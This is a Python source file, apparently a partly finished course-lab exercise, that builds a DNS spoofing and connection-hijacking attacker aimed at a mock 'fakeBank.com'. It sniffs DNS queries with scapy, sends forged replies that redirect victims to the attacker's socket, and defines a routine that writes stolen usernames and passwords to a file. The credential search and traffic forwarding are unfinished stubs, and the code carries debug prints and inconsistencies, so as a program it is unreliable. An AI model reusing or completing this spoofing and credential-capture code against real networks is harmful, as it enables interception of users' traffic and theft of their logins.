import argparse
import socket
from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "fakeBank.com"

def resolveHostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection. 
	# Normally obtained via DNS lookup.
	return "127.1.1.1"

def log_credentials(username, password):
	# Write stolen credentials out to file
	with open("lib/attacker/StolenCreds.txt","wb") as fd:
		fd.write("Stolen credentials: username="+username+" password="+password)

def check_credentials(client_data):
	# TODO: Take a block of client data and search for username/password credentials
	# If found, log the credentials to the system by calling log_credentials().
	raise NotImplementedError

def handle_tcp_forwarding(client_socket, client_ip, hostname):
	# TODO: Continuously intercept new connections from the client
	# and initiate a connection with the host in order to forward data

	#client_socket.bind((client_ip,WEB_PORT))
	print "HH"

	#client_socket.bind((client_ip,WEB_PORT))
	

	client_socket.listen(5)
	#client_socket.connect((client_ip,WEB_PORT))


	while True:
		
#		print "BB"
		# TODO: accept a new connection from the client on client_socket and
	 	# create a new socket to connect to the actual host associated with hostname
		sock, adrr = client_socket.accept()
		print "ARrr"
#		print addr


		

		# TODO: read data from client socket, check for credentials, and forward along to
		# host socket. Check for POST to '/post_logout' and exit after that request has completed.

		

#def temp(client_socket, client_ip):

def temp(client_ip,socket):
	def dns_callback(pkt):
		spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst, proto=pkt[IP].proto)/\
					  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
					  DNS(id=pkt[DNS].id, qr=1, aa=1, ancount = 1, qd=pkt[DNS].qd, an = DNSRR(rrname=HOSTNAME,rdata=resolveHostname(HOSTNAME),ttl=10))
		send(spoofed_pkt, verbose = 0)
		handle_tcp_forwarding(socket, client_ip, HOSTNAME)
	return dns_callback

	
	


	

	# TODO: Write callback function for handling DNS packets.
	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof
	

def sniff_and_spoof(source_ip):
	# TODO: Open a socket and bind it to the attacker's IP and WEB_PORT
	# This socket will be used to accept connections from victimized clients
	#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock = socket.socket()
	
	#sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	sock.bind((source_ip,WEB_PORT))
	#sock.connect((resolveHostname(HOSTNAME),WEB_PORT))

	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
	# and the socket you created as extra callback arguments. 
	sniff(iface="lo", prn=temp("127.0.0.1",sock), filter="udp", store=0)

def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip',nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')

	args = parser.parse_args()
	print args
	sniff_and_spoof(args.source_ip)

if __name__=="__main__":
	main()
